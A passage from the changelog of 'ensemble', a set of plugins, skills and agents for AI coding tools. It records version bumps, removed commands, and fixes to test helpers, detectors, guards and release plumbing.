- **packages/core, packages/infrastructure:** the four detector skills (`framework-detector`, `test-detector`, `tooling-detector`, `cloud-provider-detector`) are merged into one `detect-stack` skill in `ensemble-core`. One CLI replaces the four scripts: `node skills/detect-stack/detect-stack.js [path] --axis=framework|test|tooling|cloud|all` (`--tool x` is now `--tools=x`). The output is one envelope (`axis`, `detected`, `primary`, `confidence`, `threshold`, `results`, `all_results`) instead of three schemas, and exit codes are uniform (0 detected, 1 nothing detected, 2 error). Weights, thresholds and boosts are unchanged. The `ensemble-infrastructure` agents and `deep-debugger` (`ensemble-quality`) call it, so install `ensemble-core` alongside those packages; see their READMEs. Replacement table: `skills/detect-stack/REFERENCE.md`.
- **packages/assessment:** `assess-repo` / `assess-team` delegate to their leaf skills (single source); numeric-first scoring throughout. `ensemble-assessment` is now Pi-installable and is no longer bundled into `ensemble-pi` (install both). Still included in `ensemble-full`.
- **scripts/generate-codex:** framework skill path rewriting now matches the bare skill name (`skills/<name>/` -> `.codex/skills/<name>/`) instead of the old `<name>-framework` names.

### Removed

- **packages/git:** the `/ensemble:claude-changelog` command (unrelated to ensemble workflows). Use the `changelog-generator` skill for conventional-commit changelogs.
- **packages/metrics:** the `/ensemble:sprint-status` and `/ensemble:web-metrics-dashboard` commands (near-empty stubs with no tools or callers). `/ensemble:manager-dashboard` remains.
- **packages/e2e-testing:** the `/ensemble:playwright-test` command (a stub that only delegated to `playwright-tester`). Use `/ensemble:author-playwright-tests` or the `playwright-tester` agent.
- **packages/git, packages/quality:** the `release-agent` agent (a duplicate of the `/ensemble:release` command, which delegates to `git-workflow`, `github-specialist` and `deployment-orchestrator` directly) and the `test-reader-agent` fixture agent. The pi-extension live smoke script now uses `ensemble:manager-dashboard` as its read-only command.

### Fixed

- Agents (`backend-developer`, `frontend-developer`, `ensemble-orchestrator`, `infrastructure-developer`, `mobile-developer`) no longer reference skills that do not exist (`*-framework`, `gcp-cloud`, `azure-cloud`, `react-native`); `ensemble-full` now includes the `react` skill.
- **packages/rspec, packages/xunit:** the `rspec` and `xunit` skills were 22-line stubs and their helper scripts were broken. Both are now full skills with a section layout matching `jest`/`pytest`/`exunit`; every code example was run (RSpec 3.13 and xunit 2.9.3 on .NET 10). `rspec/generate-test.rb` crashed without `--source`, mis-cased class names and always generated a vacuously passing example; `rspec/run-test.rb` printed all-zero counts. `xunit/generate-test.cs` did not compile (CS0136); `xunit/run-test.sh` ran `dotnet test <file.cs>`, asked for a non-existent `json` logger and always printed a hard-coded success. Both now report real `{success, passed, failed, skipped, total, failures[]}` JSON. **Behavior change:** the generated placeholder test is no longer a passing test (`skip` for RSpec, `Assert.Fail` for xUnit) so a scaffold cannot be mistaken for coverage. `rspec` also gains `skills/REFERENCE.md`, which `lib/index.js` already tried to load. `xunit/generate-test.cs` now needs the .NET 10 SDK (`dotnet run generate-test.cs`).
- **packages/core:** `detect()` in `lib/index.js` called `FrameworkDetector` without `new` and threw on every call; it now constructs the detector and forwards options (regression test added).
- **packages/development, packages/full, packages/blazor:** `ensemble-dotnet` is now in `configure-team.yaml` (`domain_to_plugins.backend`, `framework_keyword_to_plugin`) and the `ensemble-full` peerDependencies; the `ensemble-blazor` description no longer claims `.NET` backend skills.
- **scripts/pi:** the Pi generator now prunes stale output. A file is removed only if it provably carries the generator's own marker (prompt header, command-wrapper skill proof, or the new marker line that agents and copied skills now carry), so hand-authored files survive; `--dry-run` reports without deleting; `generate()` and `generateAll()` return `{ pruned }`. Every generated Pi agent and skill file gains one marker line.
- **docs/PRD:** `PRD-2026-87e64cc6` v1.1.0 amends REQ-009 (hiding is allowed behind a dispatcher), notes the folded variants as an exception under REQ-018, and leaves REQ-004 / AC-004-1 untouched.

### Release plumbing

- Aggregate release bumped so existing full-plugin installations receive the
  changed content: `ensemble-full` 6.9.9 → 7.0.0. This is a MAJOR release
  because commands, skills and agents are removed or renamed (see Changed and
  Removed above). Content-change bumps follow semver per package.
  - MAJOR (a skill, command, agent or library API was renamed or removed):
    `ensemble-ai` 5.2.1 → 6.0.0, `ensemble-blazor` 5.1.0 → 6.0.0,
    `ensemble-codex` 5.3.6 → 6.0.0 (regenerated; eight command wrapper skills
    and two agents removed, skills renamed), `ensemble-core` 5.6.3 → 6.0.0,
    `ensemble-development` 6.0.11 → 7.0.0, `ensemble-e2e-testing` 5.4.1 →
    6.0.0, `ensemble-git` 5.3.2 → 6.0.0, `ensemble-infrastructure` 5.3.0 →
    6.0.0, `ensemble-metrics` 5.2.2 → 6.0.0, `ensemble-product` 5.6.5 → 6.0.0,
    `ensemble-quality` 5.4.0 → 6.0.0 and `ensemble-react` 5.1.0 → 6.0.0.
  - MINOR (additive or rewritten content): `ensemble-assessment` 1.0.0 → 1.1.0
    (`/ensemble:assess`, Pi-installable), `ensemble-dotnet` 1.0.0 → 1.1.0
    (gains the `dotnet` skill), `ensemble-rspec` and `ensemble-xunit` 5.1.0 →
    5.2.0 (full skills and working helper scripts).
  - PATCH: `ensemble-exunit`, `ensemble-jest`, `ensemble-nestjs`,
    `ensemble-phoenix`, `ensemble-pytest` and `ensemble-rails` 5.1.0 → 5.1.1
    (skill frontmatter `name` is now the bare technology name and docs point at
    `detect-stack`; Claude Code keys skills by directory name and Pi already
    normalized the name, so only Codex's generated skill identifier changed,
    and that ships in `ensemble-codex` 6.0.0), `ensemble-reqnroll` 1.0.1 →
    1.0.2 (docs point at the `/ensemble:reqnroll` dispatcher),
    `ensemble-router` 5.2.2 → 5.2.3 (rules follow the renamed and removed
    skills and agents).
  - `ensemble-pi` 1.6.15 → 1.6.16 was bumped by
    `scripts/bump-pi-version-if-changed.js` (`postgenerate:pi`) earlier on this
    branch, not by hand. `ensemble-pi-extension` stays at 0.1.2: it has no
    marketplace entry and is installed from a checkout.
- `@sunstone-partners/ensemble-*` dependency ranges that the new versions no
  longer satisfy were moved to the new majors (`^6.0.0`, and `^7.0.0` for
  `ensemble-development`) in each dependent package, in `ensemble-full`'s
  peerDependencies and in `ensemble-pi`'s `ensemble-core` dependency, so a
  plain `npm install` still resolves against the workspace.
  `package-lock.json` was brought back in line (it had drifted:
  `ensemble-quality` 5.3.0, `ensemble-pi` 1.6.15, and no `ensemble-dotnet` peer
  on `ensemble-full`).

## [6.9.9] - 2026-10-17

### Added

- **packages/pi-extension, packages/agent-core:** command lifecycle hooks
  (`command.start` / `command.end`) — a trusted `hooks.yaml` per command can
  observe or block command invocation, with a two-condition trust gate,
  digest-bound per-user trust store, run tracker, prompt/event runner, and
  bounded shutdown; `ensemble_command_complete` tool and per-turn instruction
  (TRD-2026-f08a2a09, #168).
- **packages/development:** `pr-review-cycle` skill plus
  `lib/pr-review-*.js` / `pr-review-cli.js`: head-bound, base-correct review
  loop with a finding ledger, terminal-status contract (`REVIEW_COMPLETE` /
  `REVIEW_PENDING` / `REVIEW_BLOCKED`), bounded remediation rounds, and
  fail-closed validation; integrated into `fix-issue`,
  `implement-trd-beads`, and `complete-beads` at their PR boundaries.
  `new-feature`/`feature` gain `--foreman` non-interactive mode.
  (TRD-2026-82b6a138 #156-#159; #165.)
- **packages/quality:** `pr-review-remediation` skill consumed by the above.

### Fixed

- **packages/product:** generated Reqnroll step bindings use literal Cucumber
  expressions for special characters, and method names are unique within a
  requirement; migration rewrites legacy attributes without replacing
  implemented bodies (#154, #161, #162).
- **packages/development:** beads are labelled by TRD and `bv` plans are
  label-scoped; only the current TRD's beads are staged and `br`'s own export
  no longer halts the gate; the clean-tree gate is decided after resume
  detection; `trd-parser` accepts `AC checklist:` labels and keeps every REQ
  in a multi-REQ `[satisfies …]` bracket (#129, #130, #145, #166).
- **packages/core:** QuickTunnel missing-binary tests pin the binary
  resolver, dropping the environment-dependent bare-`cloudflared` assertions
  (#155).
- **packages/development:** `new-feature` reads its invocation arguments from
  `$ARGUMENTS` (#167).

### Release plumbing

- Aggregate release bumped so existing full-plugin installations receive the
  changed content: `ensemble-full` 6.9.8 → 6.9.9, with content-change bumps
  `ensemble-development` 6.0.10 → 6.0.11, `ensemble-codex` 5.3.5 → 5.3.6
  (regenerated skills), `ensemble-e2e-testing` 5.4.0 → 5.4.1,
  `ensemble-git` 5.3.1 → 5.3.2, `ensemble-metrics` 5.2.1 → 5.2.2, and
  `ensemble-reqnroll` 1.0.0 → 1.0.1. `ensemble-pi` 1.6.15 is a prerequisite:
  Pi vendors the skills above in its bundle.

## [6.9.8] - 2026-10-14

### Added

- **packages/e2e-testing:** follow-along SlowMo pause for headed
  `author-playwright-tests` runs. Bumps `ensemble-e2e-testing` 5.3.0 → 5.4.0
  (#149).
- **packages/assessment:** new `ensemble-assessment` skill package at 1.0.0,
  with Pi/OMP-specific tool references normalized to be runtime-generic
  (#142, #143, #144).
- **packages/quality:** `pr-review-remediation` skill. `ensemble-quality`
  5.3.0 → 5.4.0 (#147).
- **packages/development:** tag task beads `foreman-exec` under `--foreman`
  after bv planning (#150).

### Changed

- **packages/product, packages/development:** the PRD/TRD workflow is now
  `create-prd` → `refine-prd` → `create-trd` → `refine-trd` →
  `implement-trd-beads`. `create-prd` and `create-trd` no longer print the
  downstream implement/TRD commands; `refine-prd` ends with a PRD Lock and
  `refine-trd` with an Implementation Go / No-Go, and each prints the next
  command only on the approving branch. `create-trd` now pins
  `prd_reference` to the PRD's file path, warns when the source PRD has no
  `refine-prd` changelog entry, and detects a PRD whose version moved after
  the TRD was built. `refine-trd` now emits its declared Configure-Team
  Suggestion. Bumps `ensemble-product` 5.6.3 → 5.6.4 (#112, closes #100).

### Fixed

- **packages/development:** `trd-cli list/status` work again —
  `extractDesignReadinessScore` is exported (#123); TRD frontmatter keys are
  read regardless of case and spacing (#124); `team-defaults` loads without
  `js-yaml` (#125); composed bead titles are clamped to br's 500-character
  limit (#126); `beads-build-wave` is registered in the plugin manifests and
  the command halts early without it (#127); br's wrapped list output and any
  bead id prefix are accepted during epic discovery (#128). Bumps
  `ensemble-development` 6.0.9 → 6.0.10.
- **packages/pi:** regenerated `packages/pi/skills` — the assessment package
  and `pr-review-remediation` were missing. `ensemble-pi` 1.6.12 → 1.6.13
  (#148).

### Release plumbing

- `ensemble-codex` 5.3.4 → 5.3.5 (regenerated skills from the changes above)
  and `ensemble-full` 6.9.7 → 6.9.8, which serves the changed packages
  through symlinks.

## [6.9.7] - 2026-10-07

### Fixed

- **scripts/validate-release-bump.js:** the v6.9.6 release's exemption for a
  package that legitimately retires its only `marketplace.json` entry was a
  silent `continue`, which could also mask a future *accidental* deletion of
  an actively-shipping plugin's entry. Kept the exemption but made it a
  visible `console.warn` naming the package and its last known version (#137).
- **README.md, packages/development/README.md:** both had drifted out of
  sync with the command-surface-consolidation work in 6.9.6 — a stale
  `/ensemble:feature` description, missing `/ensemble:prd`/`/ensemble:trd`/
  `/ensemble:issue`/`/ensemble:list-issue` rows, a fictional `/dashboard`
  command, and missing `ensemble:` prefixes. Also found and fixed in the
  README's Architecture section: three shipped skill packages
  (`ensemble-ai`, `ensemble-dotnet`, `ensemble-reqnroll`) missing entirely,
  and two packages listed that no longer exist
  (`ensemble-agent-progress-pane`, `ensemble-task-progress-pane`, removed in
  `14b37d9`). Bumps `ensemble-development` 6.0.8 → 6.0.9 (#138, #139).
- **GitHub wiki** (`07-Commands.md`, `14-Example-Session.md`,
  `02-Architecture.md`, `Home.md`): same command-surface drift as above, plus
  a "Behavior Runtime" section and a "behavior-runtime layer" mention that
  still described `agent-core`/`pi-extension` as hosting the autofix-dispatch
  subsystem removed in 6.9.6 — rewritten to describe current reality (native
  Pi/OMP command completion only). Published directly to the wiki, outside
  this repo's PR flow.

## [6.9.6] - 2026-10-07

### Removed

- **agent-core, pi-extension:** entire behavior-runtime/autofix-loop subsystem
  removed from `dev` (`.ensemble/behaviors/`, `packages/agent-core/src/behavior/`,
  the autofix/constitution-proposal/working-tree-snapshot wiring in
  `packages/pi-extension`). A globally-loaded OMP/Pi extension was found to
  wire this into every session on the operator's machine via a buggy
  working-tree rollback mechanism that could silently drop uncommitted work.
  Retained, unmodified, on the `pi-behaviors` branch for future development
  once its known bugs are fixed upstream (#133). Bumps `ensemble-agent-core`
  0.1.1 → 0.1.2 and `ensemble-pi-extension` 0.1.1 → 0.1.2.
- **pi-extension:** restored a trimmed `scripts/smoke-activate.mjs` (the one
  real-ESM-loader proof #133 had removed along with the echo tool it used to
  assert) so AC-004-1 still has coverage jest structurally cannot provide
  (#134).

### Fixed

- **development:** `beads-build-wave` preflight now hard-gates against
  dispatching on the repository default branch (detached HEAD and
  default-branch checks), and its lifecycle contract gained an independent
  Commit Gate between subagent success and `br close` -- a subagent's
  self-reported success is no longer sufficient evidence of a commit (#132).
  Bumps `ensemble-development` 6.0.7 → 6.0.8, `ensemble-codex` 5.3.3 → 5.3.4,
  `ensemble-product` 5.6.2 → 5.6.3.
- **pi:** regenerated derived prompts/skills to match source YAML changes
  across the above; `ensemble-pi` 1.6.11 → 1.6.12 (auto-bumped by
  `postgenerate:pi`).

`ensemble-full` 6.9.5 → 6.9.6.

## [6.9.5] - 2026-10-01

### Added

- **development, product:** `new-feature` command adopts a PRD, orchestrating
  `create → refine → create → refine → implement` end to end, replacing
  `implement-trd` (#113, #114).

### Fixed

- **agent-core:** `isRestorationToHistory()` in the write-boundary guard now recognizes
  a path-scoped restore (`git checkout <good-sha> -- <path>`) as a revert instead of a
  fresh violation, so an agent can correct a bad protected-path commit without the guard
  reverting its own correction (br-suoh, #109). Bumps `ensemble-agent-core` 0.1.0 → 0.1.1.
- **core, git, router, codex:** OMP command discovery fix and parameters-rendering fix
  for the new-feature workflow (#114). Bumps `ensemble-core` 5.6.1 → 5.6.2,
  `ensemble-git` 5.3.0 → 5.3.1, `ensemble-router` 5.2.1 → 5.2.2,
  `ensemble-codex` 5.3.2 → 5.3.3, `ensemble-product` 5.6.1 → 5.6.2,
  `ensemble-development` 6.0.6 → 6.0.7.
- **opencode:** version sync restored between `package.json`/`plugin.json` and the
  plugin's own `ENSEMBLE_META` constant, which had drifted from the package's
  hardcoded-scaffolding version. Bumps `ensemble-opencode` 5.3.0 → 5.3.1.
- **pi-extension:** `ensemble-pi-extension` 0.1.0 → 0.1.1, carrying the accumulated
  isolation, consent, and dispatch hardening already merged to `dev` since v6.9.4.

### Removed

- **development, product:** `implement-trd` command, superseded by `new-feature` (#114).

`ensemble-full` 6.9.4 → 6.9.5.

## [6.9.4] - 2026-09-26

### Fixed

- **core:** the `init-project` constitution template emits Article-style headings (#68).
  Bumps `ensemble-core` 5.6.0 → 5.6.1.
- **development:** `create-trd-foreman` runs the Constitution Gate (#67), and `create-trd`
  makes the gate observable on every run (#69). Bumps `ensemble-development` 6.0.5 → 6.0.6;
  regenerating the Pi output for these prompts bumps `ensemble-pi` 1.6.9 → 1.6.10.
- **product:** `create-prd` makes the Constitution Gate observable on every run (#69).
  Bumps `ensemble-product` 5.6.0 → 5.6.1.
- **pi:** generated agents keep an explicitly declared `Task` as native `task`, so OMP
  orchestrators can delegate, without granting delegation to agents that don't declare it (#71).
- **codex:** regenerated `create-prd`, `create-trd` and `create-trd-foreman` skills for the
  changes above. Bumps `ensemble-codex` 5.3.1 → 5.3.2.

### CI

- `dev` is now the integration branch; PRs into `main` must come from `dev` and pass a release
  gate that requires version bumps for changed packages (#82).
- The router's Python suite runs in CI, and fails rather than passing when pytest is missing (#75).

`ensemble-full` 6.9.3 → 6.9.4.

## [6.9.3] - 2026-08-13

### Removed

- **development:** resolve shorthand agent names to installed namespaced plugin agents before Task delegation.

### Fixed

- **core:** close SSE subscribers before `server.close()` in `refinement-review` stop()
  so the server no longer hangs on shutdown when a long-lived session has open
  EventSource clients. Bumps `ensemble-core` 5.5.0 → 5.5.1.
- **development:** include runtime-installed plugin agents (`~/.omp/plugins/node_modules/@*/agents/*.md`)
  in `AGENT_REGISTRY` and `KNOWN_AGENTS`. `configure-team` Phase 3 Step 1 and
  `implement-trd-beads` Preflight Order 11 now scan both the source
  `packages/*/agents/*.yaml` tree and the runtime plugin path, dedupe with the
  runtime entry winning, and rebuild `KNOWN_AGENTS` / `AGENT_ALIAS_MAP` after
  every plugin install. Fixes consumer-repo agent discovery gaps (e.g. foreman's
  local 3-agent registry shadowing the 30-agent OMP install registry).
- **development:** join the `do NOT re-read the file again` line in
  `configure-team.yaml` so the spec-required literal is grep-able as a single
  substring (the rendered prompt is unchanged for the LLM).
- **development:** `applyPhaseFilter` now passes `stacked: prFormat` to
  `selectNextTasks` so prFormat mode implies phase-strict dispatch instead of
  silently falling through to non-stacked behavior.
- **development:** `trd-cli` missing-subcommand error now begins with
  `Missing subcommand. ` so the smoke test assertion matches without losing
  the existing Usage hint.

## [6.9.2] - 2026-06-23

### Fixed

- **development:** preserve verbatim source TRD task markdown in generated workstream tasks so deterministic parsing does not discard semantic detail.

## [6.9.1] - 2026-06-23

### Fixed

- **development:** decompose workstream TRD acceptance criteria into AC-level implementation, test, and validation tasks.

## [6.9.0] - 2026-06-20

### Added

- **development:** add `beads-scaffold-specialist` for Beads hierarchy/dependency graph scaffolding and repair without product-code implementation.

## [6.8.1] - 2026-06-20

### Fixed

- **development:** reuse the source PRD micro UUID for generated TRD IDs; workstream TRDs still generate their own micro UUID.

## [6.8.0] - 2026-06-20

### Added

- Use micro UUID document IDs for generated PRD/TRD/workstream artifact filenames to avoid sequence-number collisions across large teams.

## [6.7.0] - 2026-06-20

### Added

- **development:** add `/ensemble:create-workstream-trd` to generate a single executable workstream TRD from multiple source TRDs while preserving provenance.
- **development:** deprecate direct multi-TRD `/ensemble:implement-trd-beads` execution; require generated workstream TRDs by default.

## [6.6.5] - 2026-06-20

### Fixed

- **development:** scaffold explicit AC-* validation and XC-* cross-cutting beads, and enforce Definition of Done gates before bead closure.

## [6.6.4] - 2026-06-19

### Fixed

- **development:** resolve shorthand agent names to installed namespaced plugin agents before Task delegation.

## [6.6.3] - 2026-06-19

### Fixed

- **development:** keep implement-trd-beads running through routine progress milestones; only pause for real user decisions.

## [6.6.2] - 2026-06-19

### Fixed

- **full:** parse TRD scalar frontmatter without requiring installed npm dependencies in plugin cache.

## [6.6.1] - 2026-06-18

### Fixed

- **full:** bundle TRD CLI helper modules required by installed Beads/TRD commands.

## [6.6.0] - 2026-06-18

### Added

- **development:** add multi-TRD workstream support
- **development:** add refine-beads command

### Changed

- **TRD:** sync refine-beads checkboxes
- add refine-beads TRD
- archive completed PRDs
- document multi-TRD workstreams
- update multi-TRD workstream TRD
- stop tracking beads issue database

### Fixed

- **development:** address coderabbit findings

## [5.12.0] - 2026-04-12

### Added

- **Pi runtime** (`ensemble-pi`): Translation-layer runtime for Ensemble commands, with skill-copier and CRLF normalization (#55).
- **Codex package** (`ensemble-codex`): Codex release notes generation and project installation scripts.
- **Standards discovery**: `/ensemble:discover-standards` and `/ensemble:inject-standards` commands for extracting and applying coding conventions.
- **Implement-bead command**: Single-bead implementation workflow (`/ensemble:implement-bead`).
- **Feature pipeline**: `/ensemble:feature` orchestration command combining PRD → TRD → implementation (#53).
- **Requirement traceability**: End-to-end `validate-requirements` and `requirement-status` commands (#52).
- **Auto-team configuration**: Automated team config generation from TRD complexity analysis (TRD-AUTOTEAM-001).
- **Beads-plan and beads-build**: Commands for bead hierarchy analysis and builder/code-review/close pipeline.
- **Team-based execution model** for `implement-trd-beads`: Team YAML parser, state machine, parallel builders, QA delegation, rejection loops, metrics, and quality gates.
- **Session logging**: `/ensemble:sessionlog` command with sensitive data exclusion and incremental logging.
- **OpenCode support**: Full translation layer for OpenCode runtime — SkillCopier, CommandTranslator, AgentTranslator, HookBridge, ManifestGenerator, and distribution packaging.

### Changed

- **PRD/TRD commands rewritten**: Competitive analysis rewrite of `fold-prompt`, `create-prd`, `create-trd` with interview-style elicitation.
- **Refine commands**: Added readiness gates to `refine-prd` and `refine-trd`.
- **Git workflow**: Consolidated on git-town, removed jj-vcs skill.
- **implement-trd-beads**: Migrated from bd to br/bv with wheel instructions, added PRD/TRD file links to bead task descriptions.
- **Model aliases**: Simplified — removed opus-4-6 and sonnet-4 aliases.
- Command frontmatter now includes version, category, and last-updated fields.

### Fixed

- Pi runtime: `sourceRoot` derived from `__dirname` instead of `process.cwd()`.
- Pi skill-copier: CRLF → LF normalization to prevent CI drift.
- implement-trd-beads: Corrected backwards dependency wiring in scaffold.
- create-trd: Addressed code review findings M-1 and M-2.
- version-manager: Widened commit message character allowlist.

### Removed

- `agent-progress-pane` and `task-progress-pane` packages (consolidated).

## [5.3.0] - 2026-02-17

### Added

- Initial 5.x release series with 23 packages, 28 agents, and 4-tier architecture.
- See git history for detailed changes from 4.0.0 to 5.3.0.

## [4.0.0] - 2025-12-09

### Added

- Modular plugin architecture replacing the v3.x monolith.
- 20 specialized plugins organized across core, workflow, framework, and testing layers.
- Plugin dependency resolution and marketplace integration.
- NPM workspace support, validation schemas, CI workflows, and publishing automation.

### Changed

- Installation moved from a single monolith to modular plugin installs.
- Plugin names now use the `ensemble-` prefix and `@sunstone-partners/` npm scope.
- Installation size and plugin load time were significantly reduced through modularization.

## [3.6.5]

### Changed

- Last release before the v4 plugin architecture migration.
- See the v3.x branch for the pre-plugin changelog history.
